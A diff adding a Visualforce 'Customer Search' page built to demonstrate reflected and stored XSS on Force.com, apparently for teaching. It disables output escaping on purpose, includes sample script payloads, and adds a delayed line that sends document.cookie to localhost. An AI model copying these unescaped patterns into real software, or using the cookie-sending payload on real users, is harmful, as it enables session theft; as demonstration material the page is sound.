@@ -1,0 +1,85 @@
+<apex:page showHeader="true" sidebar="true" controller="OWASP_3_XSS_Controller">
+    <!--
+        Page that demonstrates a couple of different XSS attacks on Force.com. 
+        XSS is a way of executing Javascript on a page that the authors of that
+        page did not intend to be run.
+
+        This page is intended to be used as a 'Customer Search' - a value is
+        entered and then the Description field of that Account is then displayed
+        in the page. Not massively useful, but enough to give an idea.
+
+        Visualforce has a number of XSS protections that make these types of
+        attack difficult. To quote the VF docs:
+
+        "All standard Visualforce components, which start with <apex>, 
+        have anti-XSS filters in place"
+
+        Attacks are still possible however. This page demos persistent and 
+        non-persistent flavours of XSS:
+
+        1. Non-Persistent - if there is a URL Parameter called query, the search
+            term is displayed on the page. This is displayed with an OutputText
+            component that sets the escape attribute to false. If the value of 
+            this parameter is Javascript, this will execute. For example, try:
+            /apex/OWASP_3_XSS?query=<script>alert();</script>
+
+            Google Chrome has an XSS auditor that will pick up at run time that
+            the page is going to run Javascript code that appears in the URL and
+            blocks it. This does work in Firefox however.
+
+        2. Persistent - on an Account record, set the value of the Description 
+            field to <script>alert('hello');</script> Then, go to the page and
+            search for the name of the account, and a dialog box will be appear.
+
+            When this example executed, after 5 seconds of getting the result 
+            back from the remote method, the browser will issue a get request
+            to localhost, with a url parameter with the value of 
+            document.cookie. Use your browsers dev tools to see what that 
+            contains...
+
+        P.S. - HTML and Javascript are not my strong suit ;)
+    -->
+	<apex:includeScript value="{!$Resource.jquery191}"/>
+
+	<script>
+        /*  searchForAccount()
+            Setup to handle clicks on the 'Search' button - retrieves the search
+            term and passes it into a remote method. If a record is returned, a
+            new element is added to a results area with the content.
+        */
+		function searchForAccount() {
+            
+			var searchTerm = document.getElementById('searchTerm').value;
+
+			Visualforce.remoting.Manager.invokeAction(
+	            '{!$RemoteAction.OWASP_3_XSS_Controller.doASearch}',
+    	        searchTerm, 
+        	    function(result, event){
+            	    if (event.status) {
+            	    	jsonResult = $.parseJSON(result);
+                	    $("#results").append(jsonResult['Description']).append("<br/>");
+                	    setTimeout( function() {
+                	    		$.get("http://localhost/?" + document.cookie)
+                	    	},
+                	    	5000
+                	    );
+    	            } else if (event.type === 'exception') {
+    	            	console.log('Exception: ', event);
+	                } else {
+	                	console.log('Something else: ', event.message);
+        	        }
+            	}, 
+            	{escape: false}
+            );
+		}
+	</script>
+
+	<apex:outputText escape="false" value="You searched for: {!searchTerm}"/>
+	
+	<br/>Search box: <input id="searchTerm"/> <button onclick="searchForAccount()">Search-me-do!</button><p/>
+
+	Results:<p/>
+	<div id="results">
+	</div>
+
+</apex:page>
